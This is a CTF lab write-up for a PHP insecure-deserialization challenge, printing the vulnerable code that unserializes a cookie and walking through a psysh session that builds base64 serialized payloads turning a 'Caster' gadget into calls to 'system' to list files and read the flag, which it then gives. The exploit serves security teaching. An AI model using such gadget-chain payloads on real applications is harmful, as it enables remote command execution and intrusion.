---
title: Simple Web 0x18(Lab - Magic Cat)
tags: [NTUSTWS, CTF, Web]

category: "Security/Course/NTUST WS/Deserialization"
---

# Simple Web 0x18(Lab - Magic Cat)
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8602/

## Background
None...

## Source code
:::spoiler code
```php=<?php
isset($_GET['source']) && die(!show_source(__FILE__));

class Magic
{
    function cast($spell)
    {
        echo "<script>alert('MAGIC, $spell!');</script>";
    }
}

// Useless class?
class Caster
{
    public $cast_func = 'intval';
    function cast($val)
    {
        return ($this->cast_func)($val);
    }
}


class Cat
{
    public $magic;
    public $spell;
    function __construct($spell)
    {
        $this->magic = new Magic();
        $this->spell = $spell;
    }
    function __wakeup()
    {
        echo "Cat Wakeup!\n";
        $this->magic->cast($this->spell);
    }
}

if (isset($_GET['spell'])) {
    $cat = new Cat($_GET['spell']);
} else if (isset($_COOKIE['cat'])) {
    echo "Unserialize...\n";
    $cat = unserialize(base64_decode($_COOKIE['cat']));
} else {
    $cat = new Cat("meow-meow-magic");
}
?>
<pre>
This is your 🐱:
<?php var_dump($cat) ?>
</pre>

<p>Usage:</p>
<p>/?source</p>
<p>/?spell=the-spell-of-your-cat</p>

```
:::

### Description & Analyze

## Exploit - unserialize
1. Test payload in local side
    ```bash!
    $ ./psysh
    > class Caster
    . {
    .     public $cast_func = 'intval';
    .     function cast($val)
    .     {
    .         return ($this->cast_func)($val);
    .     }
    . }
    > $test = new Caster
    = Caster {#2772
        +cast_func: "intval",
      }

    > $test->cast_func = 'system'
    = "system"
    > $test->cast('pwd')
    = "/home/sbk6401"
    ```
2. Construct serialized session
    ```bash!
    > class Cat
    . {
    .     public $magic;
    .     public $spell;
    .     function __construct($spell)
    .     {
    .         $this->spell = $spell;
    .         $this->magic = new Caster();
    .     }
    .     function __wakeup()
    .     {
    .         echo "Cat Wakeup!\n";
    .         $this->magic->cast($this->spell);
    .     }
    . }
    > $cat = new Cat("ls -al /")
    = Cat {#2771
        +magic: Caster {#2763
          +cast_func: "intval",
        },
        +spell: "ls -al /",
      }
    > $cat->magic->cast_func = "system"
    = "system"
    > base64_encode(serialize($cat))
    = "TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjg6ImxzIC1hbCAvIjt9"
    ```
    ![](https://i.imgur.com/x5tCrhb.png)

3. Get flag
    ```bash!
    > $cat->spell = "cat /flag*"
    = "cat /flag*"

    > base64_encode(serialize($cat))
    = "TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjEwOiJjYXQgL2ZsYWcqIjt9"
    ```
    ![](https://i.imgur.com/c5Kq7c4.png)

Flag: `FLAG{magic_cat_pwnpwn}`

## Reference
[PHP物件導向的第一課：class ](https://ithelp.ithome.com.tw/articles/10114633)
[【第十九天 - PHP反序列化(1)】](https://ithelp.ithome.com.tw/articles/10277044)